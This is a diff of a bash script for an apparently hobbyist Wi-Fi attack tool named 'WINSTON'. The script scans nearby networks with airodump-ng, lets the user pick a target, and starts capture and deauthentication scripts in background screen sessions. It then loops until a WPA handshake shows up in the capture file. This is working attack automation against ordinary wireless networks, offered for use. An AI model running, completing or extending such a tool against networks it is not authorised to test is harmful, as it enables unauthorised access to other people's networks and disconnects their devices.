@@ -50,31 +50,14 @@ fi
 
 sudo airodump-ng $interface -w /winston/kenel/airodump-ng --write-interval 1 --output-format csv &>/dev/null &
 
+through=1
+through=$(($through))
 
-echo "WINSTON: IS THERE A SPECIFIC NETWORK YOU'RE LOOKING FOR?
-"
-read -p "$username: " answer
-if [[ $answer = "yes" ]]; then
-    echo "WINSTON: WHAT'S THE NETWORK NAME?
-    "
-    read -p "$username: " answer1
-    name=$answer1
-    clear
-    echo "WINSTON: SAY LESS.
-    "
-    while true; do
-        if cat /winston/kenel/airodump-ng-01.csv | grep $answer1; then
-            sudo kill -9 $(pstree -p | grep airodump-ng | grep -o '[0-9]\+') &>/dev/null
-            clear
-            echo "WINSTON: FOUND IT
-            "
-            break
-        fi
-    done
-elif [[ $answer = "no" ]]; then
-    while true; do
+while true; do
+    if [[ $through -gt 1 ]]; then
+        clear
         echo "WINSTON: HERE'S YOUR OPTIONS
-        "
+    "
         echo "$(cat /winston/kenel/airodump-ng-01.csv | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+' | grep -v IP)" > /winston/kenel/network_options.txt
         options=/winston/kenel/network_options.txt
         lines=$(cat $options | wc -l 2>/dev/null)
@@ -89,49 +72,52 @@ elif [[ $answer = "no" ]]; then
         "
         read -p "$username: " line
         line=$(($line))
-        if [ $line -eq 1 && $line -lt $(($lines + 1)) ]; then
-            name="$(cat /winston/kenel/airodump-ng-01.csv | grep $(cat $options | sed -n ${line}p) | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
-            echo "$name"
+        if [[ $line -ge 1 && $line -lt $(($lines + 1)) ]]; then
+            option=$(cat $options | sed -n ${line}p)
+            name="$(cat /winston/kenel/airodump-ng-01.csv | grep $option | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
             break
-        elif [ $response1 -eq $(($lines + 1)) ]; then
+        elif [ $line -eq $(($lines + 1)) ]; then
             echo "WINSTON: PLEASE WAIT
-            "
+        "
             sleep 10
             continue
         fi
         break
-    done
-fi
+    elif [[ $through -eq 1 ]]; then
+        echo "WINSTON: INITIALIZING
+        "
+        through=$(($through + 1))
+        sleep 5s
+        continue
+    fi
+done
 
-echo "WINSTON: HERE'S THE NETWORK INFORMATION.
-"
-search=/winston/kenel/airodump-ng-01.csv
-name=$(cat $search | grep "$name" | awk {'print $19'} | grep -oE '[A-Za-z0-9:_-]+')
-SSID=$(cat $search | grep "$name" | awk {'print $1'} | grep -oE '[A-Za-z0-9:_-]+')
-channel=$(cat $search | grep "$name" | awk {'print $6'} | grep -oE '[A-Za-z0-9:_-]+')
-security=$(cat $search | grep "$name" | awk {'print $8'} | grep -oE '[A-Za-z0-9:_-]+')
-if [[ $security = "not" ]]; then
-    security="not found"
-fi
-echo "name: $name
-SSID: $SSID
-Channel: $channel
-Network Security: $security
+dump=/winston/kenel/airodump-ng-01.csv
+
+essid=$(cat $dump | grep $name | head -n 1 | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')
+bssid=$(cat $dump | grep $name | head -n 1 | awk {'print $1'} | grep -oe '[A-Z0-9_:]\+')
+channel=$(cat $dump | grep $name | head -n 1 | awk {'print $6'} | grep -oe '[0-9]\+')
+
+echo "name: $essid
+ssid: $bssid
+channel: $channel
 interface: $interface" > /winston/kenel/network_settings
 
-if [[ $security = "WPA3" ]]; then
-    echo "WINSTON: I'M SORRY, THERE'S NOTHING I CAN DO ABOUT THIS ONE.
-    "
-    exit 0
-fi
-sudo kill -9 $(pstree -p | grep airodump-ng | grep -o '[0-9]\+') &>/dev/null
-clear
-
 screen -dmS capture ./capture.sh
+
+cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[A-F0-9:]\+' > /winston/kenel/device_options
+
+screen -dmS deauth ./deauth.sh
+
 sleep 10s
-pid=$(screen -ls | grep capture | grep -oe '[0-9]')
 
-cat /winston/kenel/psk-01.csv | grep -A 100 Station | awk {'print $1'} | grep -oe '[A-Za-z0-9:]\+' | grep -v Station > /winston/kenel/device_options
-
-#start here
-
+while true; do
+    if cat /winston/kenel/psk-01.csv | awk -F, '$6 ~ /WPA/ {print $1}' | grep -E "^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}"; then
+        pid=$(screen -ls | grep "(" | awk {'print $1'} | grep -oe '[0-9]\+')
+        screen kill $pid
+        echo "we got it"
+        break
+    else
+        continue
+    fi
+done
